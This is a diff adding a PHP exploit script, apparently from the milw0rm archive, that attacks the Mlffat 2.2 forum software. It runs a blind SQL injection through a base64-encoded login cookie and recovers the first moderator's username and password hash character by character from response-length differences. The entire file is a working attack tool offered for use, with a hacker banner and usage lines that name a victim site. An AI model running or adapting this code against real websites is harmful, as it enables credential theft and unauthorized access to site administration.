@@ -1,0 +1,201 @@
+<?php
+ini_set("max_execution_time",0);
+print_r('
+                                       ||          ||   | ||
+                                o_,_7 _||  . _o_7 _|| q_|_||  o_///_,
+                               (  :  /    (_)    /           (      .
+
+                                        ___________________
+                                      _/QQQQQQQQQQQQQQQQQQQ\__
+[q] Mlffat 2.2 Blind SQL Inj.      __/QQQ/````````````````\QQQ\___
+                                 _/QQQQQ/                  \QQQQQQ\
+[q] Cookie <3                   /QQQQ/``                    ```QQQQ\
+                               /QQQQ/                          \QQQQ\
+[q] http://www.mlffat.com     |QQQQ/    By  Qabandi             \QQQQ|
+                              |QQQQ|                            |QQQQ|
+                              |QQQQ|    From Kuwait, PEACE...   |QQQQ|
+                              |QQQQ|                            |QQQQ|
+                              |QQQQ\       iqa[a]hotmail.fr     /QQQQ|
+[/]   -[Tam al tableegh]-      \QQQQ\                      __  /QQQQ/
+                                \QQQQ\                    /QQ\_QQQQ/
+                                 \QQQQ\                   \QQQQQQQ/
+                                  \QQQQQ\                 /QQQQQ/_
+                                   ``\QQQQQ\_____________/QQQ/\QQQQ\_
+                                      ``\QQQQQQQQQQQQQQQQQQQ/  `\QQQQ\
+                                         ```````````````````     `````
+ ______________________________________________________________________________
+/                                                                              \
+|                          Sec-Code.com ;)    Join the revolution              |
+\______________________________________________________________________________/
+                                \ No More Private /
+                                 `````````````````
+');
+
+if ($argc<6) {
+print_r('
+-----------------------------------------------------------------------------
+Usage:   php '.$argv[0].' VICTIM DIR user_id username password
+--VICTIM == the website that has the script installed.
+--DIR    == Directory of script, /mlffat/ or // for root dir
+--user_id== Your user ID (you must register)
+--username= your username
+--password= your password
+
+example: php '.$argv[0].' mlffat.com /demo/ 1 mlffat test
+
+or if in root dir:
+example: php '.$argv[0].' EXAMPLE.com // 1 mlffat test
+-----------------------------------------------------------------------------
+');
+die;
+}
+ function QABANDI($victim,$vic_dir,$user_id,$user_name,$user_pass,$injection){
+$host = $victim;
+$usrid= $user_id;
+$usrnm= $user_name;
+$usrpw= $user_pass;
+$p = "http://".$host.$vic_dir;
+
+$user_id_inj = $usrid.$injection;
+$qookie = base64_encode($user_id_inj.":".$usrnm.":".md5($usrpw));
+          $packet ="GET ".$p."index.php?action=account&view=editprofile HTTP/1.0\r\n";
+          $packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n";
+          $packet.="Pragma: no-cache\r\n";
+          $packet.="Cookie: member=".$qookie.";\r\n";
+          $packet.="Connection: Close\r\n\r\n";
+        //  if ($debug == 1){
+        // print $qookie."\n\n";
+         // }
+	$o = @fsockopen($host, 80);
+	if(!$o){
+		echo "\n[x] No response...\n";
+		die;
+	}
+	
+	fputs($o, $packet);
+	while (!feof($o)) $data .= fread($o, 1024);
+	fclose($o);
+	
+	$_404 = strstr( $data, "HTTP/1.1 404 Not Found" );
+	if ( !empty($_404) ){
+		echo "\n[x] 404 Not Found... Make sure of path. \n";
+		die;
+	}
+
+                                           return $data;
+
+ }
+
+$host1 = $argv[1];
+$userdir1=$argv[2];
+$userid1= $argv[3];
+$username1= $argv[4];
+$userpass1= $argv[5];
+
+
+
+
+
+
+if ($argc > 2) {
+
+echo "\nPlease wait, this will take time, el9abr zain ;)\n";
+$r = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and 1='1"));
+echo "\nExploiting:\n";
+$w = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and 1='0"));
+$t = abs((100-($w/$r*100)));
+echo "Username: ";
+for ($i=1; $i <= 30; $i++) {
+
+  $q = QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and ascii(substring((select name from mlffat_moderators limit 0,1),".$i.",1))!='0");
+
+$laenge = strlen($q);
+   if (abs((100-($laenge/$r*100))) > $t-1) {
+      $count = $i;
+      $i = 30;
+   }
+}
+for ($j = 1; $j < $count; $j++) {
+   for ($i = 46; $i <= 122; $i=$i+2) {
+      if ($i == 60) {
+         $i = 98;
+      }
+
+
+
+      $laenge = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and ascii(substring((select name from mlffat_moderators limit 0,1),".$j.",1))>'".$i));
+
+            
+
+      if (abs((100-($laenge/$r*100))) > $t-1) {
+
+
+
+
+                  $laenge = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and ascii(substring((select name from mlffat_moderators limit 0,1),".$j.",1))>'".($i-1)));
+
+
+
+
+
+      
+
+         if (abs((100-($laenge/$r*100))) > $t-1) {
+            echo chr($i-1);
+         } else {
+            echo chr($i);
+         }
+         $i = 122;
+      }
+   }
+}
+echo "\nPassword: ";
+for ($j = 1; $j <= 49; $j++) {
+   for ($i = 46; $i <= 102; $i=$i+2) {
+      if ($i == 60) {
+         $i = 98;
+      }
+      
+
+   //          if ($j>9){
+
+ //    $hg=QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and ascii(substring((select Password from mlffat_moderators limit 0,1),".$j.",1)) > '".$i);
+
+
+       //      }
+             
+             //             if ($j<9){
+
+ //    $hg=QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and ascii(substring((select Password from mlffat_moderators limit 0,1),".$j.",1)) > '".$i);
+
+  
+     //        }
+                             //         if ($j=9){
+
+     $hg=QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and ascii(substring((select Password from mlffat_moderators limit 0,1),".$j.",1)) > '".$i,1);
+
+
+      //       }
+
+      $laenge = strlen($hg);
+
+      if (abs((100-($laenge/$r*100))) > $t-1) {
+        
+        
+
+         $laenge = strlen(QABANDI($host1,$userdir1,$userid1,$username1,$userpass1,"' and ascii(substring((select Password from mlffat_moderators limit 0,1),".$j.",1)) > '".($i-1),1));
+
+
+         if (abs((100-($laenge/$r*100))) > $t-1) {
+            echo chr($i-1);
+         } else {
+            echo chr($i);
+         }
+         $i = 102;
+      }
+   }
+}
+}
+?>
+
+# milw0rm.com [2009-07-09]
